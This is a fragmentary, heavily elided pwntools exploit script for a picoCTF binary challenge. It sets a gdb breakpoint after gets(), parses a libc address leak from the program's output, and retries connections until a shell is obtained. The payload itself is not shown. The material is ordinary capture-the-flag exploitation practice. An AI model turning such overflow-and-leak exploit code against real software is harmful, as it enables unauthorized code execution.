...
gdbscript = [
    ...
    "b *main+195", #instruction after gets()
    # "dis 1",
    "commands",
    "silent",
    "end",
...
def conn():
    #return remote('tethys.picoctf.net', 54751)
    argv = [exe.path]
    if args.GDB:
...
def main():
    ...
    #exit(0)
    print('reading in libc leak')
    oll=context.log_level 
    context.log_level='debug'
    data=r.recvuntil(bytes.fromhex('5b  50 4f 4e 47  5f 4f 4b 5d  0a'))
    #"""r.recvn(0x8912+3-8)    #'''print(r.recv(0x88dd))
    print('done reading in leak')
    context.log_level=oll
    #leak = u64(r.recvn(8))
    leak = u64(data[-56:-48])
    #print(data[-60:].hex())
    #print('raw leak', data[-69:-61].hex())
...
if __name__ == "__main__":
    ...
    while not shell:
        ...
        try:
            ...
            if type(e) is pwnlib.exception.PwnlibException:
                exit(1)
            context.log_level=oll
            curr_remote.close()
        tryn += 1 
